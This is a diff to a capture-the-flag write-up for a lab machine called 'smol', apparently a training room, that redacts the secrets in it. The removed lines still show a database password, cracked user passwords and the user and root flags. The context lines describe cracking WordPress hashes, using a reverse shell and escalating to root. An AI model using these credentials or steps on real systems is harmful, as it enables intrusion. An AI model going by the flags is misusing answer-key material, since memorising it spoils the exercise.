@@ -162,7 +162,7 @@ www-data
 ```
 www-data@smol:/$ mysql -u wpuser -p
 mysql -u wpuser -p
-Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
+Enter password: *redacted*
 ```
 
 -> Looking through, I found a table named wp_users with usernames and password hashes
@@ -200,7 +200,7 @@ Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 128
 Cost 1 (iteration count) is 8192 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-sandiegocalifornia (diego)
+*redacted* (diego)
 ```
 
 -> I tried logging into ssh but was unsuccessful. Instead, I just switched user's to diego on the reverse shell
@@ -225,7 +225,7 @@ ls
 user.txt
 diego@smol:~$ cat user.txt
 cat user.txt
-45edaec653ff9ee06236b7ce72b86963
+*redacted*
 ```
 
 -> Now, to privilege escalate, let's first run ```sudo -l```
@@ -233,7 +233,7 @@ cat user.txt
 ```
 diego@smol:~$ sudo -l
 sudo -l
-[sudo] password for diego: sandiegocalifornia
+[sudo] password for diego: 
 
 Sorry, user diego may not run sudo on smol.
 ```
@@ -352,7 +352,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-hero_gege@hotmail.com (wordpress.old.zip)
+*redacted*@hotmail.com (wordpress.old.zip)
 ```
 
 -> After unzipping the file and going through its contents, we find the user xavi's password in wp-config.php
@@ -379,7 +379,7 @@ User xavi may run the following commands on smol:
 xavi@smol:~$ sudo su
 root@smol:/home/xavi$ cd /root
 root@smol:~$ cat root.txt
-bf89ea3ea01992353aef1f576214d4e4
+*redacted*
 ```
 
 -> With that, we have the final flag for this room, root.txt
